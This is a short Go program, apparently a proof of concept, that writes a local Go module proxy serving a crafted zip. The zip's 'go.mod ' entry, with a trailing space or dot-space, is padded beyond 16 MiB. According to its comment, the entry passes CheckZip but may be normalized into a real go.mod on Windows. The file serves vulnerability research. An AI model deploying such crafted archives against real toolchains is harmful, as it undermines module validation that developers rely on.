package main

import (
	"archive/zip"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	var root string
	var variant string
	flag.StringVar(&root, "root", defaultRoot(), "proxy root directory")
	flag.StringVar(&variant, "variant", "space", "filename variant: space or dot-space")
	flag.Parse()

	entryName, err := goModEntryName(variant)
	must(err)

	root = filepath.Join(root, "example.com", "p", "@v")
	must(os.MkdirAll(root, 0o755))

	must(os.WriteFile(filepath.Join(root, "v1.0.0.info"), []byte(`{"Version":"v1.0.0","Time":"2026-07-12T00:00:00Z"}`), 0o644))
	must(os.WriteFile(filepath.Join(root, "v1.0.0.mod"), []byte("module example.com/p\n\ngo 1.21\n"), 0o644))
	must(os.WriteFile(filepath.Join(root, "list"), []byte("v1.0.0\n"), 0o644))

	zipPath := filepath.Join(root, "v1.0.0.zip")
	_ = os.Remove(zipPath)
	zf, err := os.Create(zipPath)
	must(err)

	zw := zip.NewWriter(zf)
	write := func(name, body string) {
		w, err := zw.Create(name)
		must(err)
		_, err = w.Write([]byte(body))
		must(err)
	}

	// This file is accepted by CheckZip today because it is not treated as "go.mod".
	// On Windows, ordinary path handling may normalize it into an effective go.mod.
	write("example.com/p@v1.0.0/"+entryName, "module example.com/p\n\ngo 999.0\n"+strings.Repeat("x", (16<<20)+1))
	write("example.com/p@v1.0.0/p.go", "package p\nconst X = 1\n")

	must(zw.Close())
	must(zf.Close())

	fmt.Printf("built file proxy at %s with entry %q\n", root, entryName)
}

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func defaultRoot() string {
	if os.PathSeparator == '\\' {
		return filepath.Join(os.TempDir(), "trailing-space-proxy")
	}
	return "/tmp/trailing-space-proxy"
}

func goModEntryName(variant string) (string, error) {
	switch variant {
	case "space":
		return "go.mod ", nil
	case "dot-space":
		return "go.mod. ", nil
	default:
		return "", fmt.Errorf("unknown variant %q", variant)
	}
}
